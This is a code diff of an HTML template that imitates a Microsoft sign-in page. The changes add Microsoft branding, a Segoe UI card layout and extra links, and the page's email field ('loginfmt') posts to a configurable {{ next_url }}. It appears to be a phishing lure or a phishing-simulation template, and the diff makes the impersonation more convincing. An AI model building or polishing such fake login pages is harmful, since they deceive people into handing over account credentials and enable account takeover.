@@ -1,32 +1,107 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>Sign in to your account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body{font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;margin:0}
-        .box{background:#fff;padding:40px 50px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.1);width:320px;box-sizing:border-box;text-align:center}
-        img{width:120px;margin-bottom:30px}
-        h3{margin:0 0 20px;font-weight:600;font-size:20px;color:#333}
-        input{width:100%;padding:10px 12px;margin-bottom:20px;font-size:16px;border:1px solid #ccc;border-radius:4px}
-        button{background:#0067b8;color:#fff;border:none;border-radius:4px;padding:10px 0;width:100%;font-size:16px;cursor:pointer}
-        button:hover{background:#005ba1}
-        a{display:block;margin-top:15px;font-size:14px;color:#0067b8;text-decoration:none}
+        body {
+            background: linear-gradient(135deg, #f3f6fb 0%, #e9eef6 100%);
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .ms-card {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+            padding: 48px 40px 32px 40px;
+            width: 100%;
+            max-width: 360px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .ms-logo {
+            margin-bottom: 32px;
+        }
+        .ms-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+            letter-spacing: -0.5px;
+        }
+        .ms-input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 16px;
+            border: 1.5px solid #c7c7c7;
+            border-radius: 6px;
+            margin-bottom: 24px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .ms-input:focus {
+            border-color: #0067b8;
+        }
+        .ms-btn {
+            width: 100%;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 0;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 16px;
+        }
+        .ms-btn:hover, .ms-btn:focus {
+            background: #005ba1;
+        }
+        .ms-link {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 8px;
+            display: block;
+            text-align: left;
+            width: 100%;
+        }
+        .ms-link:focus, .ms-link:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 480px) {
+            .ms-card {
+                padding: 32px 12px 24px 12px;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <!-- Office 365 logo (SVG inline to avoid external request) -->
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Microsoft logo" width="48" height="48">
-            <path fill="#f25022" d="M4 4h18v18H4z"/>
-            <path fill="#00a4ef" d="M26 4h18v18H26z"/>
-            <path fill="#7fba00" d="M4 26h18v18H4z"/>
-            <path fill="#ffb900" d="M26 26h18v18H26z"/>
-        </svg>
-        <h3>Sign in</h3>
-        <form method="post" action="{{ next_url }}">
-            <input type="text" name="loginfmt" placeholder="Email, phone, or Skype" required autofocus>
-            <button type="submit">Next</button>
+    <div class="ms-card">
+        <div class="ms-logo">
+            <!-- Microsoft logo SVG -->
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48" aria-label="Microsoft logo">
+                <rect width="20" height="20" x="2" y="2" fill="#f25022"/>
+                <rect width="20" height="20" x="26" y="2" fill="#7fba00"/>
+                <rect width="20" height="20" x="2" y="26" fill="#00a4ef"/>
+                <rect width="20" height="20" x="26" y="26" fill="#ffb900"/>
+            </svg>
+        </div>
+        <div class="ms-title">Sign in</div>
+        <form method="post" action="{{ next_url }}" style="width:100%">
+            <input class="ms-input" type="text" name="loginfmt" placeholder="Email, phone, or Skype" required autofocus autocomplete="username">
+            <button class="ms-btn" type="submit">Next</button>
         </form>
-        <a href="#">Can’t access your account?</a>
+        <a class="ms-link" href="#">Can’t access your account?</a>
+        <a class="ms-link" href="#">Sign-in options</a>
     </div>
 </body>
 </html>
